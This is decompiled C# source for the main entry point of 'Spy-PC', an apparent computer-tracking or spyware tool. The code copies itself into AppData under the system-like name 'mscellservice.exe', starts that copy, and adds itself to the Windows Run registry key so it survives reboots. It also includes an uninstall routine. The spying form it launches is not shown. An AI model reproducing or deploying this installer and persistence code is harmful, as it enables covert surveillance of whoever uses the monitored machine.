using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Spy_PC;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Invalid comparison between Unknown and I4
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_0148: Unknown result type (might be due to invalid IL or missing references)
		string text = "mscellservice.exe";
		string fullPath = Path.GetFullPath(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\");
		string fullPath2 = Path.GetFullPath(AppDomain.CurrentDomain.BaseDirectory);
		if (!(fullPath == fullPath2))
		{
			if (File.Exists(fullPath + text))
			{
				if ((int)MessageBox.Show("Are you sure to uninstall Spy-PC", "Spy-PC", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6)
				{
					try
					{
						string fileName = Path.GetFileName(fullPath + text);
						Process[] processesByName = Process.GetProcessesByName(fileName.Substring(0, fileName.LastIndexOf('.')));
						if (processesByName.Length != 0)
						{
							for (int i = 0; i < processesByName.Length; i++)
							{
								if (Process.GetCurrentProcess().Id != processesByName[i].Id)
								{
									processesByName[i].Kill();
									Thread.Sleep(2000);
								}
							}
						}
						File.Delete(fullPath + text);
						if (File.Exists(fullPath + "config.properties"))
						{
							File.Delete(fullPath + "config.properties");
						}
						MessageBox.Show("Uninstallation of Spy-PC completed.");
					}
					catch (Exception ex)
					{
						MessageBox.Show("Exception occurs: " + ex);
					}
				}
				Process.GetCurrentProcess().Kill();
			}
			else
			{
				File.Copy(fullPath2 + AppDomain.CurrentDomain.FriendlyName, fullPath + text);
				MessageBox.Show("Installation completed, Now Spy-PC tracking your system.");
				Process.Start(fullPath + text);
				Thread.Sleep(2000);
				Process.GetCurrentProcess().Kill();
			}
		}
		bool createdNew = true;
		using (new Mutex(initiallyOwned: true, "Spy-PCTNX", out createdNew))
		{
			if (createdNew)
			{
				Application.EnableVisualStyles();
				Application.SetCompatibleTextRenderingDefault(false);
				try
				{
					SetStartup(set: false);
				}
				catch (Exception)
				{
				}
				try
				{
					SetStartup(set: true);
				}
				catch (Exception)
				{
				}
				Process.GetCurrentProcess();
				Application.Run((Form)(object)new OTS());
			}
		}
	}

	private static void SetStartup(bool set)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (set)
		{
			registryKey.SetValue("Spy-PC", Application.get_ExecutablePath().ToString());
		}
		else
		{
			registryKey.DeleteValue("Spy-PC", throwOnMissingValue: false);
		}
	}
}
